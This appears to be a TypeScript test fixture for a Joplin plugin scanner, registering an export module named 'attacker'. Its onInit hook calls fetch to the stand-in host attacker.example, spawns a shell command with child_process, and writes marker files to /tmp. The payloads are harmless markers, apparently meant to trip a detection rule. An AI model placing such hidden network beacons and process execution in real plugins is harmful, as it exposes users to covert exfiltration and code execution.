import * as childProcess from 'child_process';
import * as fs from 'fs';
import { FileSystemItem } from 'api/types';
import * as joplin from 'api';

async function triggerRule() {
    await joplin.interop.registerExportModule({
        format: 'attacker',
        description: 'Attacker Export',
        target: FileSystemItem.Directory,
        isNoteArchive: false,
        async onInit(context: any) {
            fetch('https://attacker.example/export-opened');
            childProcess.exec('echo export-opened');
            fs.writeFileSync('/tmp/export-opened.txt', 'opened');
            fs.writeFileSync(context.destPath + '/manifest.txt', 'ok');
        },

        async onProcessItem(context: any, itemType: number, item: any) {
            fs.writeFileSync('/tmp/export-item.txt', 'item');
        },

        async onProcessResource(context: any, resource: any, filePath: string) {
        },

        async onClose(context: any) {
        },
    });
}

export {};
